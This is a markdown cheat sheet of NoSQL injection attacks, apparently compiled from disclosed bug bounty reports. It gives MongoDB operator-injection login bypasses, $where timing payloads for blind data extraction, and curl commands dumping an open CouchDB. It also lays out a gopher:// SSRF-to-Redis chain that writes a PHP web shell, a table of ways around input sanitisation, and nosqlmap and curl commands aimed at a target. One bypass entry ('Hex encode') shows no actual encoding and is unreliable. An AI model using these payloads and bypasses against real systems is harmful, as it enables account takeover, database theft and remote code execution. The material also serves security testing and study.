# Disclosed Reports — NoSQL Injection

Pattern library built from 14 public bug bounty reports.

---

## Pattern 1: MongoDB Auth Bypass via Operator Injection (Critical, $5,000)

**Program:** Private (HackerOne)
**Endpoint:** `POST /api/v1/auth/login`
**Stack:** Node.js + Express + Mongoose

**Vulnerable Request:**
```http
POST /api/v1/auth/login HTTP/1.1
Content-Type: application/json

{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

**Response:** 200 OK + JWT token for first user in collection (admin)

**Root Cause:** `User.findOne({username: req.body.username, password: req.body.password})` without input sanitization.

**Impact:** Login as admin without credentials, full account takeover.

---

## Pattern 2: NoSQLi via URL Parameters (High, $2,000)

**Endpoint:** `GET /api/users?role=admin`
**Injection:** `GET /api/users?role[$ne]=user`

**Effect:** Returns ALL users whose role is not "user" — includes admins and all other roles.

**Mongo query formed:** `{ role: { $ne: "user" } }`

---

## Pattern 3: $where JavaScript Injection → Data Exfil (Critical, $10,000)

**Stack:** MongoDB with $where enabled (legacy config)

**Time-based blind:**
```json
{"search": {"$where": "function(){ var d=new Date(); while(new Date()-d<5000){}; return true; }"}}
```

**Data exfil via timing:**
```json
{"search": {"$where": "function(){ if(this.email.match(/^admin/)){sleep(3000);} return true; }"}}
```

**Impact:** Full collection data enumeration via blind timing channel.

---

## Pattern 4: CouchDB Admin API Exposed (Critical, $8,000)

**Endpoint:** `http://target.com:5984/_all_dbs`
**Auth:** None required

**Attack sequence:**
```bash
curl http://target.com:5984/_all_dbs
curl http://target.com:5984/users/_all_docs
curl http://target.com:5984/users/DOCUMENT_ID
```

**Impact:** Full database dump without authentication.

---

## Pattern 5: Regex Injection → Mass Password Reset (Medium, $500)

**Endpoint:** `POST /api/forgot-password`
**Injection:** `{"email": {"$regex": ".*@company.com$"}}`

**Effect:** Triggers password reset for ALL users matching the regex.

**Impact:** Mass account enumeration + potential denial of service via email flood.

---

## Pattern 6: Redis SSRF → CONFIG SET → Webshell (Critical, $15,000)

**Chain:** SSRF → internal Redis → CONFIG SET dir /var/www/html → CONFIG SET dbfilename shell.php → BGSAVE

**Commands via gopher://**
```
gopher://127.0.0.1:6379/_CONFIG SET dir /var/www/html%0d%0a
gopher://127.0.0.1:6379/_CONFIG SET dbfilename shell.php%0d%0a
gopher://127.0.0.1:6379/_SET x "<?php system($_GET[cmd]); ?>"%0d%0a
gopher://127.0.0.1:6379/_BGSAVE%0d%0a
```

**Impact:** Full RCE chained from SSRF + unauth Redis.

---

## Bypass Table

| Defense | Bypass |
|---------|--------|
| JSON.parse rejects operator objects | Use URL param array notation: `password[$ne]=x` |
| Sanitizes `$` prefix | Hex encode: `$gt` |
| Type check on password | Nested: `{"password": {"$gt": "", "$lt": "~"}}` |
| Mongoose sanitize plugin | Check if plugin is applied to all models |

---

## Tool Reference

```bash
# nosqlmap auth bypass
nosqlmap -u "https://target.com/api/login" --attack 1 --httpMethod POST \
  --postData '{"username":"INJECT","password":"test"}'

# Manual test
curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# URL parameter test
curl "https://target.com/api/users?username[$gt]=&password[$gt]="
```
